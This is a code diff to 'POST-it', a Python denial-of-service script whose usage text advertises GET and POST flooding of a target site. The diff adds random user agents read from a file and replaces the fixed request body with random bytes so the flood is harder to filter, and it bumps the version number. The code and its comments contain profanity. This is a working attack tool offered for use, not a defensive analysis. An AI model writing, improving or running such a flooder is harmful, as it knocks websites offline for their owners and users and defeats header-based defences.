@@ -1,11 +1,26 @@
 #!/usr/bin/python
+# Fuck it, added better random junk...
+# Fuck it, added RandomUserAgent...
 
+import os
 import sys
 import socket
 import time
 import getopt
 import re
 from threading import Thread
+import random
+
+ualist = []
+
+def load_useragents():
+    if os.path.isfile('./ualist.txt'):
+        for f in open('./ualist.txt', 'r'):
+            ualist.append(f)
+
+load_useragents()
+            
+userAgent = random.choice(ualist)
 
 class MyThread(Thread,):
     def __init__(self,SITE, DOS_TYPE):
@@ -16,12 +31,12 @@ class MyThread(Thread,):
     def run(self):
         while not self.kill_received:
             server = socket.gethostbyname(self.site)
-            post = 'x' * 6000
+            post = os.urandom(6000)
             file = 'index.php'
 
             request = '%s /%s HTTP/1.1\r\n' %(self.method.upper(),file)
             request += 'Host: %s\r\n' % (self.site)
-            request += 'User-Agent: Mozilla/5.0 (Windows; U;Windows NT 6.1; en-US; rv:1.9.2.12) Gecko/20101026Firefox/3.6.12\r\n'
+            request += 'User-Agent: ' + userAgent
             request += 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
             request += 'Accept-Language: en-us,en;q=0.5\r\n'
             request += 'Accept-Encoding: gzip,deflate\r\n'
@@ -68,7 +83,7 @@ def da_delegator(SITE,DOS_TYPE):
                 threads = [t.join(1) for t in threads if t is not
 None and t.isAlive()]
             except KeyboardInterrupt:
-                print "Ctrl-c received! Sending kill to threads... Just Kill The Terminal" # Need to fix this!!!
+                print "Ctrl-c received! Sending kill to threads... COCKS! It didnt work! Just Kill The Terminal" # Need to fix this!!!
                 for t in threads:
                     t.kill_received = True
                     sys.exit(2)
@@ -76,7 +91,7 @@ None and t.isAlive()]
 def main(argv):
     def usage():
         print '=' * 60
-        print 'POST-it v1.1.0'.center(60,'-')
+        print 'POST-it v1.5.0'.center(60,'-')
         print '=' * 60
         print 'For get DOS - USAGE: postit.py -t get http://example.com'
         print 'For post DOS - USAGE: postit.py -t post http://example.com'
